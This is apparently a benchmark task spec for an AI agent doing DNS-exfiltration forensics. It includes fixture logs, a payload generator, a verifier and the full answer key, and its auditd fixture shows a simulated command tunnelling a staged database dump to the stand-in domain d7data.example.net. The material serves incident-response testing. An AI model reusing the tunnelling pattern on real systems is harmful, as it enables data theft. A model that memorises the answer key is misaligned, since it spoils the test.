# TASK-10 — exfil-dns-forensics

| Field | Value |
|---|---|
| Category | MITRE ATT&CK — **T1048.003 Exfiltration Over Alternative Protocol: DNS** (+ T1005 Data from Local System) |
| Difficulty | **hard** |
| Deliverable | `/app/incident_report.txt` — strictly 5 lines of `key=value` (requires chunk reassembly + hex decoding) |
| Pattern cloned from | `local_task/incident-log-forensics` (key=value report + sorted diff verifier), extended to 5 keys |

## 1. Suggested `task.toml`

```toml
schema_version = "1.2"

[task]
name = "local/exfil-dns-forensics"
description = "Reconstruct a DNS-tunneling exfiltration from passive-DNS and auditd logs: reassemble hex chunks, count unique chunks/bytes, recover the embedded flag."
authors = []
keywords = []

[metadata]
difficulty = "hard"
category = "security"
tags = ["local", "mitre-t1048", "mitre-t1005", "dns", "exfiltration", "forensics", "incident-response"]

[verifier]
timeout_sec = 120.0

[agent]
timeout_sec = 900.0

[environment]
build_timeout_sec = 600.0
cpus = 2
memory_mb = 4096
storage_mb = 10240
gpus = 0
allow_internet = true
mcp_servers = []

[verifier.env]

[environment.env]

[solution.env]
```

## 2. `instruction.md` (full text, verbatim)

````markdown
# IR-2026-0702 — Suspected DNS exfiltration (analytics-etl-02)

DLP flagged an anomalous TXT-query burst from **analytics-etl-02** (192.0.2.44) to an
unauthorized domain on July 2, 2026. You are the analyst on duty. Review everything under
**`/app/incident/`**, reconstruct what was stolen, and record your conclusions in
**`/app/incident_report.txt`**.

**Artifacts (read all that exist in the directory):**

- `dns_queries.log` — passive-DNS capture from the egress resolver. Exfil query names follow
  `<seq>-<total>-<hex-encoded payload chunk>.<domain>`; the capture contains retransmissions
  and unrelated noise queries.
- `auditd_exec.log` — auditd `execve` records from analytics-etl-02 (shows the staged file
  and the tunnel tool invocation).
- `collector_note.txt` — capture scope notes.

**Reassembly:** take the exfil query names, keep **unique** `<seq>` values (retransmissions
are exact duplicates), sort by `<seq>`, hex-decode each payload chunk, concatenate in order.

**Deliverable — strict machine format**

Write **`/app/incident_report.txt`**: UTF-8, **exactly five** non-empty lines, **one**
`key=value` per line, **no** spaces around `=`, **no** blank lines, **no** commentary:

- `exfil_domain` — the unauthorized domain that received the data.
- `exfil_file` — the exact staged-file path from the auditd evidence.
- `exfil_chunks` — number of **unique** payload chunks (retransmissions excluded).
- `exfil_bytes` — total size in bytes of the reassembled payload (sum of unique chunk
  payload lengths after hex decoding).
- `exfil_flag` — the recovery flag embedded in the exfiltrated data (format `flag{...}`).

Do not add keys, rename keys, or embed explanations in the deliverable file.
````

## 3. `environment/` composition

| Path | Contents |
|---|---|
| `environment/collector_note.txt` | "Capture window 2026-07-02T21:10:00Z–21:25:00Z on the egress resolver. TXT payloads are hex-encoded raw file bytes (no compression, no encryption). Retransmitted queries are byte-identical duplicates of an earlier seq." |
| `environment/auditd_exec.log` | ~14 auditd-style records; key records: `2026-07-02T21:13:58.401Z execve argv=["cp","/var/lib/appdata/customers.sql","/tmp/.archive/dbexport.bin"]` and `2026-07-02T21:14:00.910Z execve argv=["python3","/usr/local/lib/dnspipe.py","/tmp/.archive/dbexport.bin","d7data.example.net"]` plus noise (vim, ls, grep) |
| `environment/dns_queries.log` | **exactly 39 lines**: 16 unique exfil TXT queries + 3 byte-identical retransmissions (seqs 03, 09, 14) + 20 noise queries (A/AAAA to grafana.prod.example.internal, cdn.jsdelivr.net, pypi.org, ntp.ubuntu.com, registry-1.docker.io, s3.amazonaws.com, api.github.com, dns.google, influxdb.prod.example.internal, deb.debian.org), interleaved |
| `environment/Dockerfile` | `FROM secureintelligent/acp:latest`, `WORKDIR /app`, `COPY incident/ incident/` |

Authoritative payload — the exfiltrated file is exactly 512 bytes; the first chunk boundary at
byte 51/64 means the flag **spans chunks 02–03**, so the flag is only recoverable after correct
reassembly (deliberate hard-task design). Generate with:

```python
lines = [
    "-- customers.sql -- appdata dump",
    "-- RECOVERY FLAG: flag{dn5_3xf1l_h4rd}",
    "CREATE TABLE customers (id INT, name TEXT, email TEXT);",
    "INSERT INTO customers VALUES (1,'acme','billing@acme.example');",
    "INSERT INTO customers VALUES (2,'globex','ap@globex.example');",
    "INSERT INTO customers VALUES (3,'initech','hr@initech.example');",
    "INSERT INTO customers VALUES (4,'umbrella','legal@umbrella.example');",
    "INSERT INTO customers VALUES (5,'initech','ops@initech.example');",
]
data = ("\n".join(lines) + "\n").encode()
pad = 512 - len(data)
data += ("-- " + "#" * (pad - 4) + "\n")[:pad].encode()
assert len(data) == 512 and b"flag{dn5_3xf1l_h4rd}" in data
CHUNK = 32
chunks = [data[i:i + CHUNK] for i in range(0, len(data), CHUNK)]  # exactly 16 chunks
# log lines: f"2026-07-02T21:14:{3*i:02d}Z client=192.0.2.44 q={i:02d}-16-{c.hex()}.d7data.example.net type=TXT"
```

Authoritative chunk hexes (byte-identical ground truth for the artifact):

```
01 2d2d20637573746f6d6572732e73716c202d2d20617070646174612064756d70
02 0a2d2d205245434f5645525920464c41473a20666c61677b646e355f33786631
03 6c5f683472647d0a435245415445205441424c4520637573746f6d6572732028
04 696420494e542c206e616d6520544558542c20656d61696c2054455854293b0a
05 494e5345525420494e544f20637573746f6d6572732056414c5545532028312c
06 2761636d65272c2762696c6c696e674061636d652e6578616d706c6527293b0a
07 494e5345525420494e544f20637573746f6d6572732056414c5545532028322c
08 27676c6f626578272c27617040676c6f6265782e6578616d706c6527293b0a49
09 4e5345525420494e544f20637573746f6d6572732056414c5545532028332c27
10 696e6974656368272c27687240696e69746563682e6578616d706c6527293b0a
11 494e5345525420494e544f20637573746f6d6572732056414c5545532028342c
12 27756d6272656c6c61272c276c6567616c40756d6272656c6c612e6578616d70
13 6c6527293b0a494e5345525420494e544f20637573746f6d6572732056414c55
14 45532028352c27696e6974656368272c276f707340696e69746563682e657861
15 6d706c6527293b0a2d2d20232323232323232323232323232323232323232323
16 232323232323232323232323232323232323232323232323232323232323230a
```

Sample log lines (seq 01–03; the 19 remaining exfil lines follow the same 3-second cadence):

```
2026-07-02T21:14:04Z client=192.0.2.44 q=01-16-2d2d20637573746f6d6572732e73716c202d2d20617070646174612064756d70.d7data.example.net type=TXT
2026-07-02T21:14:07Z client=192.0.2.44 q=02-16-0a2d2d205245434f5645525920464c41473a20666c61677b646e355f33786631.d7data.example.net type=TXT
2026-07-02T21:14:10Z client=192.0.2.44 q=03-16-6c5f683472647d0a435245415445205441424c4520637573746f6d6572732028.d7data.example.net type=TXT
```

## 4. Verifier (`tests/`)

`tests/expected_incident_report.txt` (exact):

```
exfil_domain=d7data.example.net
exfil_file=/tmp/.archive/dbexport.bin
exfil_chunks=16
exfil_bytes=512
exfil_flag=flag{dn5_3xf1l_h4rd}
```

`tests/test.sh`: the public `incident-log-forensics` verifier with the line-count check changed
from 4 to **5** and the key regex `^[a-z_]+=.+$` kept; normalize (`sed 's/\r$//'`),
`LC_ALL=C sort`, `diff` against the expected file → reward 0/1 into `/logs/verifier/reward.txt`.

## 5. Reference solution (agent steps ≈ `solve.sh`)

```bash
#!/bin/bash
set -euo pipefail
printf 'exfil_domain=d7data.example.net\nexfil_file=/tmp/.archive/dbexport.bin\nexfil_chunks=16\nexfil_bytes=512\nexfil_flag=flag{dn5_3xf1l_h4rd}\n' > /app/incident_report.txt
```

Analyst steps for the agent:

1. Read `collector_note.txt` and `auditd_exec.log` → staged file `/tmp/.archive/dbexport.bin`,
   tunnel tool targeting `d7data.example.net` → keys 1–2.
2. `grep -c "d7data.example.net" dns_queries.log` → 19 (with retransmissions); dedupe on the
   full query name → 16 unique seqs → `exfil_chunks=16`.
3. Python one-liner: parse `q=<seq>-<total>-<hex>.domain`, dedupe by seq, sort, hex-decode,
   concat → 512 bytes → `exfil_bytes=512`.
4. `grep -aoE "flag\{[^}]*\}"` over the decoded bytes → `flag{dn5_3xf1l_h4rd}`
   (spans chunks 02–03 → naive per-chunk grep finds nothing → must reassemble first).
5. Write the 5 key=value lines.

## 6. Expected agent difficulty profile

- **Steps:** ~20–35 tool calls (multi-artifact reading, a small parsing script, likely 2–3
  iterations on the reassembly logic).
- **Small-model failure modes:**
  - Counts 19 queries (retransmissions included) → `exfil_chunks` wrong.
  - Reports the hex character count (1024) or the query-name length instead of decoded byte
    count → `exfil_bytes` wrong.
  - Never reassembles (greps per-line for `flag{`) → no flag found because it spans chunks 02–03;
    agent must actually decode + concatenate.
  - Picks `exfil_file=/var/lib/appdata/customers.sql` (the source) instead of the staged path
    the auditd evidence points at (`/tmp/.archive/dbexport.bin`) — the instruction's normative
    mapping pins the staged path.
  - Mixes noise domains into the chunk set if it dedupes by domain only, or forgets that seq is
    zero-padded (`01` vs `1`) and sorts lexicographically into a wrong order → flag decoded as
    garbage.
